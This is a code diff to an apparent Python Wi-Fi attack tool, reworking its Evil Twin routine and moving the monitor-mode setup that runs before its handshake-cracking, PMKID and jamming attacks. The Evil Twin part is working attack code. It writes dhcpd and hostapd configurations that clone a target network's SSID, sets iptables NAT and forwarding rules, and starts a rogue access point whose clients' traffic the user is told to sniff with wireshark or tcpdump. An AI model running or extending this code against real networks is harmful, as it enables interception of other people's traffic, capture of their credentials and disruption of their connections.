@@ -2,7 +2,7 @@
 
 # | IMPORT | #
 
-import os, sys, subprocess, time, re, multiprocessing, psutil
+import os, sys, subprocess, time, re, multiprocessing, psutil, textwrap
 from multiprocessing import Process, Manager
 from prettytable import PrettyTable 
 from scapy.all import *
@@ -1092,39 +1092,56 @@ def jam_network(target_ap, interface, jammer_mode):
      deauth_clients.join()
 
 
-
-def choose_evil_interfaces(detected_interfaces):
-     print(f"Select Interfaces:\n")
-
-     for idx, interface in enumerate(detected_interfaces, start=1):
-          print(f"{idx}. {interface}")
-
-     print()
-
-     def select_interface(prompt):
-          while True:
-               try:
-                    choice = int(input(f"{prompt}: ")) - 1
-                    if 0 <= choice < len(detected_interfaces):
-                         return detected_interfaces[choice]
-                    else:
-                         print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
-               except ValueError:
-                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
-
-     evil_interface = select_interface("Wireless interface number for fake AP")
-     internet_interface = select_interface("Internet interface number")
-
-     return evil_interface, internet_interface
-
 # | Evil Twin | #
+
 def evil_twin(target_ap, interface, target):
      # Prepare variables
      ssid = target_ap['SSID'] if target_ap['SSID'] else None
 
+     def choose_evil_interfaces(detected_interfaces):
+          print(f"Select Interfaces:\n")
+
+          for idx, interface in enumerate(detected_interfaces, start=1):
+               print(f"{idx}. {interface}")
+
+          print()
+
+          def select_interface(prompt):
+               while True:
+                    try:
+                         choice = int(input(f"{prompt}: ")) - 1
+                         if 0 <= choice < len(detected_interfaces):
+                              return detected_interfaces[choice]
+                         else:
+                              print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
+                    except ValueError:
+                         print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
+
+          evil_interface = select_interface("Wireless interface number for fake AP")
+          internet_interface = select_interface("Internet interface number")
+
+          return evil_interface, internet_interface
+
+     def check_internet(internet_interface):
+          print(f'\n{CYAN}[>]{RESET} Testing internet connectivity of "{internet_interface}"')
+          try:
+               # Ping google.com
+               result = subprocess.run(["ping", "-c", "4", "-I", f"{internet_interface}", 'google.com'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+               # Check if "bytes from" or "Reply from" appears in the output
+               if "bytes from" in result.stdout or "Reply from" in result.stdout:
+                    print(f'{CYAN}[>]{RESET} Internet connection on "{internet_interface}" available\n')
+                    return True
+               else:
+                    print(f'{CYAN}[>]{RESET} {RED}No internet connection{RESET} on "{internet_interface}"\n')
+                    return False
+          except Exception as e:
+               print(f"{RED}Error running ping: {e}{RESET}")
+               return False
+
      if ssid:
           detected_interfaces = []
 
+          logo()
           print(f"{CYAN}| Evil Twin (MITM/Sniffer) |{RESET}\n")
 
           try:
@@ -1138,49 +1155,74 @@ def evil_twin(target_ap, interface, target):
 
           if detected_interfaces:
                if len(detected_interfaces) > 1:
-                    evil_interface, internet_interface = choose_evil_interfaces(detected_interfaces)
+                    internet_conn = False
+                    while internet_conn == False:
+                         evil_interface, internet_interface = choose_evil_interfaces(detected_interfaces)
+                         if evil_interface == internet_interface:
+                              print(f"{RED}Interfaces can't match!{RESET}\n")
+                              continue
+                         internet_conn = check_internet(internet_interface)
                else:
-                    print(f"{RED}You need atleast 2 network interfaces to run this attack!{RESET}")
+                    print(f"{RED}You need atleast 2 network interfaces in order to run this attack!{RESET}")
 
           if evil_interface and internet_interface:
                logo()
                print(f"{CYAN}| Evil Twin (MITM/Sniffer) |{RESET}\n")
-               #print(evil_interface)
-               #print(internet_interface)
 
                def run_command(command):
                     try:
                          subprocess.run(command, shell=True, check=True)
                     except subprocess.CalledProcessError as e:
-                         print(f"Error running command: {e}")
-                    
-               # Step 1: Configure DHCP Server's Interface
+                         print(f"{RED}Error running command: {e}{RESET}")
+               
+
                dhcpd_config_file = "/etc/sysconfig/dhcpd"
-               with open(dhcpd_config_file, "a") as f:
-                    f.write(f'DHCPD_INTERFACE="{evil_interface}"\n')
-               print("DHCPD_INTERFACE set.")
+               # Read the existing configuration
+               with open(dhcpd_config_file, "r") as f:
+                    lines = f.readlines()
+               interface_line = f'DHCPD_INTERFACE="{evil_interface}"\n'
+               updated_lines = []
+               found = False
+
+               # Check if the line exists and replace it
+               for line in lines:
+                    if line.startswith("DHCPD_INTERFACE="):
+                         updated_lines.append(interface_line)
+                         found = True
+                    else:
+                         updated_lines.append(line)
+
+               # If the line wasn't found, add it at the end
+               if not found:
+                    updated_lines.append(interface_line)
+
+               # Write the updated configuration back
+               with open(dhcpd_config_file, "w") as f:
+                    f.writelines(updated_lines)
+
+
 
                # Step 2: Configure DHCP Server's Settings
                dhcpd_conf_file = "/etc/dhcpd.conf"
                with open(dhcpd_conf_file, "w") as f:
-                    f.write("""
+                    f.write(textwrap.dedent("""\
 option domain-name "local";
 option domain-name-servers 8.8.8.8, 8.8.4.4;
 default-lease-time 600;
 max-lease-time 7200;
 subnet 192.168.100.0 netmask 255.255.255.0 {
-range 192.168.100.2 192.168.100.254;
-option subnet-mask 255.255.255.0;
-option routers 192.168.100.1;
-option broadcast-address 192.168.100.255;
+     range 192.168.100.2 192.168.100.254;
+     option subnet-mask 255.255.255.0;
+     option routers 192.168.100.1;
+     option broadcast-address 192.168.100.255;
 }
-               """)
-               print("DHCPD configuration set.")
+                    """))
+               print(f'{CYAN}[>]{RESET} DHCPD configuration set')
 
                # Step 3: Configure Evil AP's Settings
                hostapd_conf_file = "/etc/hostapd.conf"
                with open(hostapd_conf_file, "w") as f:
-                    f.write(f"""
+                    f.write(textwrap.dedent(f"""\
 interface={evil_interface}
 driver=nl80211
 ssid={ssid}
@@ -1190,32 +1232,31 @@ ieee80211n=1
 wme_enabled=1
 macaddr_acl=0
 auth_algs=1
-rsn_pairwise=CCMP
-               """)
-               print("Hostapd configuration set.")
+                    """))
+               print(f'{CYAN}[>]{RESET} Hostapd configuration set')
 
                # Step 4: Set up the Evil AP's Interface
                run_command(f"sudo ip addr add 192.168.100.1/24 dev {evil_interface}")
-               print(f"Evil AP interface {evil_interface} configured.")
+               print(f'{CYAN}[>]{RESET} Evil Twin AP interface {evil_interface} configured')
 
                # Step 5: Enable Internet Connection for Clients
                run_command(f"sudo iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -o {internet_interface} -j MASQUERADE")
                run_command(f"sudo iptables -A FORWARD -i {evil_interface} -o {internet_interface} -j ACCEPT")
                run_command(f"sudo iptables -A FORWARD -i {internet_interface} -o {evil_interface} -m state --state RELATED,ESTABLISHED -j ACCEPT")
-               run_command("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
-               print("IP forwarding enabled.")
+               print(f'{CYAN}[>]{RESET} Firewall rules set')
+               run_command("sudo echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
+               print(f'{CYAN}[>]{RESET} IP forwarding enabled')
 
                # Step 6: Prevent NetworkManager from managing the Evil AP's interface
                run_command(f"sudo nmcli dev set {evil_interface} managed no")
-               print(f"NetworkManager disabled for interface {evil_interface}.")
+               print(f'{CYAN}[>]{RESET} NetworkManager disabled for interface "{evil_interface}"')
 
                # Step 7: Restart Services to Apply Configuration
-               run_command("systemctl restart dhcpd")
-               run_command("systemctl restart hostapd")
-               print("DHCPD and Hostapd services restarted.")
-
-               print("Evil AP setup completed successfully.")
-
+               print(f'{CYAN}[>]{RESET} Starting DHCP server for Evil Twin clients\n')
+               run_command("sudo systemctl restart dhcpd")
+               print(f'{CYAN}[>]{RESET} Starting Evil Twin AP - You can sniff caught clients traffic on "{evil_interface}" using tools like wireshark, tshark or tcpdump!!')
+               run_command("sudo hostapd /etc/hostapd.conf")
+               
      else:
           print(f"{RED}Target AP doesn't have SSID set!{RESET}")
 
@@ -1312,19 +1353,16 @@ else:
      
      # Run attacks
      if attack:
-          try:
-               monitor_switch('verbose', 'start', interface, target_ap['Channel']) # Make sure interface is in Monitor with target ap's channel
-          except KeyboardInterrupt:
-               pass
-          try:
-               time.sleep(2)
-          except KeyboardInterrupt:
-               pass
           target = target_ap['SSID'] if target_ap['SSID'] else target_ap['BSSID'] # Set target by checking if SSID set
           logo()
           if attack == 'Handshake Crack':
                deauth_mode = choose_deauth_mode()
                if deauth_mode:
+                    try:
+                         monitor_switch('verbose', 'start', interface, target_ap['Channel']) # Make sure interface is in Monitor with target ap's channel
+                         time.sleep(2)
+                    except KeyboardInterrupt:
+                         pass
                     try:
                          handshake_crack(target_ap, interface, deauth_mode, target) # Start attack
                     except KeyboardInterrupt:
@@ -1333,6 +1371,11 @@ else:
                               os.system(f'sudo rm {output_dir}/{file_keyword}*') # Delete all cap files created with airodump if handshake not captured
 
           elif attack == 'PMKID Attack':
+               try:
+                    monitor_switch('verbose', 'start', interface, target_ap['Channel']) # Make sure interface is in Monitor with target ap's channel
+                    time.sleep(2)
+               except KeyboardInterrupt:
+                    pass
                try:
                     pmkid_attack(target_ap, interface, target)
                except:
@@ -1355,11 +1398,21 @@ else:
                jammer_mode = choose_jammer_mode()
                if jammer_mode:
                     try:
+                         monitor_switch('verbose', 'start', interface, target_ap['Channel']) # Make sure interface is in Monitor with target ap's channel
+                         time.sleep(2)
+                    except KeyboardInterrupt:
+                         pass
+                    try:
                          jam_network(target_ap, interface, jammer_mode) # Start attack
                     except KeyboardInterrupt:
                          pass
 
           elif attack == 'Evil Twin':
+               try:
+                    monitor_switch('verbose', 'stop', interface, None)
+                    time.sleep(2)
+               except:
+                    pass
                try:
                     evil_twin(target_ap, interface, target)
                except KeyboardInterrupt:
